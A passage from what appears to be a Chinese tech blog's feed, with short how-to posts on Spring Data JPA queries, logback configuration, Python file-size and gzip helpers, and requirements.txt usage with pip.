href="#5-如何执行一个自定义的更新和删除的Sql？" class="headerlink" title="5. 如何执行一个自定义的更新和删除的Sql？"></a>5. 如何执行一个自定义的更新和删除的Sql？</h3><p>同样也是采用查询的annotation= @Query操作，但是需要加上<code>@Modifying</code>的注解，同时加上<code>@Transactional</code>注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="meta">@Modifying</span></span><br><span class="line"><span class="meta">@Query(value = &quot; update PERSON t &quot;</span></span><br><span class="line"><span class="meta">        + &quot; set t.IS_ENABLED=&#x27;0&#x27;, t.TIME_UPDATED=:timeUpdated &quot;</span></span><br><span class="line"><span class="meta">        + &quot; where t.IS_ENABLED=&#x27;1&#x27; and t.id=:id &quot;, nativeQuery = true)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">softDelete</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> <span class="keyword">long</span> id, <span class="meta">@Param(&quot;timeUpdated&quot;)</span> <span class="keyword">long</span> timeUpdated)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-如何构建分页查询数据？"><a href="#6-如何构建分页查询数据？" class="headerlink" title="6. 如何构建分页查询数据？"></a>6. 如何构建分页查询数据？</h3><p><strong>注意里面的变量不是表列，而是entity的属性名称</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Page&lt;HandleRule&gt; <span class="title">queryHandleRule</span><span class="params">(<span class="keyword">final</span> RequestRuleVo paramVo, <span class="keyword">final</span> <span class="keyword">int</span> pageNum,</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">final</span> <span class="keyword">int</span> pageSize)</span> </span>&#123;</span><br><span class="line">     Specification&lt;HandleRule&gt; spec = (root, query, criteriaBuilder) -&gt; &#123;</span><br><span class="line">         List&lt;Predicate&gt; list = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">         list.add(criteriaBuilder.equal(root.get(<span class="string">&quot;handleId&quot;</span>), paramVo.getHandleId()));</span><br><span class="line">         <span class="keyword">if</span> (StringUtils.isNotBlank(paramVo.getType())) &#123;</span><br><span class="line">             list.add(criteriaBuilder.equal(root.get(<span class="string">&quot;type&quot;</span>), paramVo.getType()));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (StringUtils.isNotBlank(paramVo.getEngine())) &#123;</span><br><span class="line">             list.add(criteriaBuilder.equal(root.get(<span class="string">&quot;engine&quot;</span>), paramVo.getEngine()));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (StringUtils.isNotBlank(paramVo.getRuleName())) &#123;</span><br><span class="line">             list.add(criteriaBuilder.equal(root.get(<span class="string">&quot;ruleName&quot;</span>), paramVo.getRuleName()));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (StringUtils.isNotBlank(paramVo.getResult())) &#123;</span><br><span class="line">             list.add(criteriaBuilder.equal(root.get(<span class="string">&quot;result&quot;</span>), paramVo.getResult()));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (StringUtils.isNotBlank(paramVo.getCode())) &#123;</span><br><span class="line">             list.add(criteriaBuilder.equal(root.get(<span class="string">&quot;code&quot;</span>), paramVo.getCode()));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> criteriaBuilder.and(list.toArray(<span class="keyword">new</span> Predicate[list.size()]));</span><br><span class="line">     &#125;;</span><br><span class="line">     Page&lt;HandleRule&gt; page = handleRuleRepository.findAll(spec, PageRequest.of(pageNum - <span class="number">1</span>,</span><br><span class="line">             pageSize, Sort.by(Sort.Direction.ASC, <span class="string">&quot;timeOrder&quot;</span>)));</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> PageImpl&lt;&gt;(page.get()</span><br><span class="line">             .collect(Collectors.toList()), page.getPageable(), page.getTotalElements());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="7-如何采用jpa方式查询单条记录？"><a href="#7-如何采用jpa方式查询单条记录？" class="headerlink" title="7. 如何采用jpa方式查询单条记录？"></a>7. 如何采用jpa方式查询单条记录？</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">Optional&lt;Transaction&gt; <span class="title">queryByTxnId</span><span class="params">(String encryptTxnId)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Optional&lt;RatingRecord&gt; <span class="title">findByCustIdEquals</span><span class="params">(String customerId)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="8-如何采用jpa查询单表是否有记录-存在该记录？"><a href="#8-如何采用jpa查询单表是否有记录-存在该记录？" class="headerlink" title="8. 如何采用jpa查询单表是否有记录,存在该记录？"></a>8. 如何采用jpa查询单表是否有记录,存在该记录？</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">existsByOriginalReqId</span><span class="params">(String reqId, IntTxnCdEnum transtionEnum, String tenant)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="8-如何查询返回结果的条数？"><a href="#8-如何查询返回结果的条数？" class="headerlink" title="8. 如何查询返回结果的条数？"></a>8. 如何查询返回结果的条数？</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Integer <span class="title">countByTimeCreatedGreaterThanEqualAndTimeCreatedLessThanAndBankIdIsInAndTxnStatusIsIn</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">           Long startTime, Long endTime,</span></span></span><br><span class="line"><span class="function"><span class="params">           List&lt;Long&gt; bankId,</span></span></span><br><span class="line"><span class="function"><span class="params">           List&lt;TxnStatus&gt; status)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;如何自动生成一个spring-jpa-entity？&quot;&gt;&lt;a href=&quot;#如何自动生成一个spring-jpa-entity？&quot; class=&quot;headerlink&quot; title=&quot;如何自动生成一个spring jpa entity？&quot;&gt;&lt;/a&gt;如何自动生成一个</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="jpa" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/jpa/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>logback使用技巧问题整理</title>
    <link href="https://seniortesting.club/posts/b53t235nOPVFCy6D/"/>
    <id>https://seniortesting.club/posts/b53t235nOPVFCy6D/</id>
    <published>2021-04-16T12:37:44.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="how-to-disable-logback-startup-load-message-in-console"><a href="#how-to-disable-logback-startup-load-message-in-console" class="headerlink" title="how to disable logback startup load message in console?"></a>how to disable logback startup load message in console?</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Stop output INFO at start --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">statusListener</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.status.NopStatusListener&quot;</span>/&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="sample-configuration-file"><a href="#sample-configuration-file" class="headerlink" title="sample configuration file"></a>sample configuration file</h2><p>if the loback configuration met some exception, we can set the <code>debug=&quot;true&quot;</code> to view the logback detail information to get the reason.</p><p><code>logback.xml</code> file</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span> <span class="attr">debug</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Stop output INFO at start --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">statusListener</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.status.NopStatusListener&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>%d %-4relative [%thread] %-5level %logger&#123;35&#125; - %msg%n<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>logs/application.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- daily rollover. Make sure the path matches the one in the file element or else</span></span><br><span class="line"><span class="comment">             the rollover logs are placed in the working directory. --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>logs/application_%d&#123;yyyy-MM-dd&#125;.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>10MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- keep 15 days&#x27; worth of history --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>15<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">totalSizeCap</span>&gt;</span>3GB<span class="tag">&lt;/<span class="name">totalSizeCap</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d %-4relative [%thread] %-5level %logger&#123;35&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;how-to-disable-logback-startup-load-message-in-console&quot;&gt;&lt;a href=&quot;#how-to-disable-logback-startup-load-message-in-console&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="logback" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/logback/"/>
    
    
  </entry>
  
  <entry>
    <title>python系列(2)-文件操作</title>
    <link href="https://seniortesting.club/posts/PxA45H5dQg/"/>
    <id>https://seniortesting.club/posts/PxA45H5dQg/</id>
    <published>2021-04-16T01:52:55.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="产生一个zip文件，generate-a-zip-file"><a href="#产生一个zip文件，generate-a-zip-file" class="headerlink" title="产生一个zip文件，generate a zip file?"></a>产生一个zip文件，generate a zip file?</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os.chdir(os.path.join(current_dir, <span class="string">&#x27;data&#x27;</span>))</span><br><span class="line">cls.verify_equals(os.getcwd(), os.path.join(current_dir, <span class="string">&#x27;data&#x27;</span>), subject=<span class="string">&#x27;getcwd Check&#x27;</span>)</span><br><span class="line">ret = os.system(<span class="string">f&quot;gzip -c <span class="subst">&#123;file_name&#125;</span> &gt; <span class="subst">&#123;file_name&#125;</span>.zip&quot;</span>)</span><br><span class="line">cls.verify_equals(ret, <span class="number">0</span>, subject=<span class="string">&#x27;gzip command return code&#x27;</span>)</span><br><span class="line">     </span><br></pre></td></tr></table></figure><h2 id="如何获取文件大小，-file-folder-size？"><a href="#如何获取文件大小，-file-folder-size？" class="headerlink" title="如何获取文件大小， file folder size？"></a>如何获取文件大小， file folder size？</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join, getsize</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定路径 path 下的文件的大小，以字节为单位</span></span><br><span class="line"><span class="comment"># 计算机中的单位换算：字节→1024-K→1024-M→1024-G→1024-T…</span></span><br><span class="line"><span class="comment"># 文件大小： </span></span><br><span class="line">fsize = os.path.getsize(<span class="string">&#x27;d:/svn/bin/SciLexer.dll&#x27;</span>)</span><br><span class="line">f_kb = fsize/<span class="built_in">float</span>(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件夹大小</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdirsize</span>(<span class="params"><span class="built_in">dir</span></span>):</span></span><br><span class="line">    size = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="built_in">dir</span>):</span><br><span class="line">        size += <span class="built_in">sum</span>([getsize(join(root, name)) <span class="keyword">for</span> name <span class="keyword">in</span> files])</span><br><span class="line">    <span class="keyword">return</span> size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 个性化大小</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">StrOfSize</span>(<span class="params">size</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    example：StrOfSize(11923)</span></span><br><span class="line"><span class="string">    递归实现，精确为最大单位值 + 小数点后三位</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strofsize</span>(<span class="params">integer, remainder, level</span>):</span></span><br><span class="line">        <span class="keyword">if</span> integer &gt;= <span class="number">1024</span>:</span><br><span class="line">            remainder = integer % <span class="number">1024</span></span><br><span class="line">            integer //= <span class="number">1024</span></span><br><span class="line">            level += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> strofsize(integer, remainder, level)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> integer, remainder, level</span><br><span class="line"></span><br><span class="line">    units = [<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;KB&#x27;</span>, <span class="string">&#x27;MB&#x27;</span>, <span class="string">&#x27;GB&#x27;</span>, <span class="string">&#x27;TB&#x27;</span>, <span class="string">&#x27;PB&#x27;</span>]</span><br><span class="line">    integer, remainder, level = strofsize(size, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> level+<span class="number">1</span> &gt; <span class="built_in">len</span>(units):</span><br><span class="line">        level = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ( <span class="string">&#x27;&#123;&#125;.&#123;:&gt;03d&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(integer, remainder, units[level]) )</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;产生一个zip文件，generate-a-zip-file&quot;&gt;&lt;a href=&quot;#产生一个zip文件，generate-a-zip-file&quot; class=&quot;headerlink&quot; title=&quot;产生一个zip文件，generate a zip file?&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/"/>
    
    <category term="python基础" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python系列(1)-requirements.txt文件使用介绍</title>
    <link href="https://seniortesting.club/posts/PqA55H5dQg/"/>
    <id>https://seniortesting.club/posts/PqA55H5dQg/</id>
    <published>2021-04-15T01:52:55.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="requirements-txt介绍"><a href="#requirements-txt介绍" class="headerlink" title="requirements.txt介绍"></a>requirements.txt介绍</h2><p>requirements.txt 文件里面记录了当前程序的所有依赖包及其精确版本号。类似于node中的<code>package.json</code>,类似于java的<code>pom.xml</code>,都是用于管理当前项目的依赖包。一个requirements.txt只是简单的列出来了当前项目使用的包。</p><p>它的语法很简单遵循以下几个规则：</p><table><thead><tr><th>Requirement specifier</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>==</td><td>等于</td><td>需要完全匹配。例如: requests==2.18.4</td></tr><tr><td>&gt;</td><td>大于</td><td>使用大于指定版本的任何版本。例如:requests&gt;2.18.4</td></tr><tr><td>&gt;=</td><td>大于等于</td><td>使用大于指定版本的任何版本. 例如: requests&gt;=2.18.4</td></tr><tr><td>&lt;</td><td>小于</td><td>使用小于指定版本的任何版本。例如: requests&lt;2.18.4</td></tr><tr><td>&lt;=</td><td>小于等于</td><td>使用小于或等于指定版本的任何版本。例如: requests&lt;=2.18.4</td></tr><tr><td>~=</td><td>兼容版本</td><td>使用大于或等于指定版本，但不大于当前版本系列的任何版本。例如: ~=1.4.2 匹配 1.4.2 到 1.4.9) 但是不匹配 1.5.0</td></tr></tbody></table><p>支持的操作符号如下:</p><p><strong>注意此处的<code>-e</code>参数使用的比较多,常用于安装本地的python包</strong></p><ol><li><p>-i, –index-url, 默认是:  <a href="https://pypi.org/simple" target="_blank" rel="noopener">https://pypi.org/simple</a></p></li><li><p>–extra-index-url</p></li><li><p>–no-index</p></li><li><p>-c, –constraint</p></li><li><p>-r, –requirement</p></li><li><p>-e, –editable, 从本地项目路径或VCS网址以可编辑模式（比如 setuptools）安装到项目中。</p></li><li><p>-f, –find-links</p></li><li><p>–no-binary</p></li><li><p>–only-binary</p></li><li><p>–prefer-binary</p></li><li><p>–require-hashes</p></li><li><p>–pre</p></li><li><p>–trusted-host</p></li><li><p>–use-feature</p></li></ol><h2 id="1-由安装包生成对应的requirements-txt文件"><a href="#1-由安装包生成对应的requirements-txt文件" class="headerlink" title="1. 由安装包生成对应的requirements.txt文件"></a>1. 由安装包生成对应的requirements.txt文件</h2><p>执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure><p>而对于使用Pycharm或者IDEA工具的小伙伴可以通过更简单的操作使得根据当前项目已经安装的包自动生成对应的<code>requirements.txt</code>文件,操作步骤如下：<br><img src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/20210415100512.png"></p><p>在弹出的对话框中可以对生成的requirements.txt文件进行相关的配置：<br><img src="https://resources.jetbrains.com/help/img/idea/2021.1/py_sync_requirements.png"></p><h2 id="2-通过requirements-txt安装项目依赖包"><a href="#2-通过requirements-txt安装项目依赖包" class="headerlink" title="2. 通过requirements.txt安装项目依赖包"></a>2. 通过requirements.txt安装项目依赖包</h2><p>执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.jetbrains.com/help/pycharm/managing-dependencies.html" target="_blank" rel="noopener">Use requirements.txt in Pycharm</a></li><li><a href="https://docs.activestate.com/platform/projects/requirements-txt/" target="_blank" rel="noopener">Requirements.Txt Syntax</a></li><li><a href="https://pip.pypa.io/en/stable/reference/pip_install/#requirements-file-format" target="_blank" rel="noopener">Requirements File Format</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;requirements-txt介绍&quot;&gt;&lt;a href=&quot;#requirements-txt介绍&quot; class=&quot;headerlink&quot; title=&quot;requirements.txt介绍&quot;&gt;&lt;/a&gt;requirements.txt介绍&lt;/h2&gt;&lt;p&gt;requir</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/"/>
    
    <category term="python基础" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java基础(1) - 位运算操作</title>
    <link href="https://seniortesting.club/posts/xzezDAFn81/"/>
    <id>https://seniortesting.club/posts/xzezDAFn81/</id>
    <published>2021-04-14T15:14:50.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
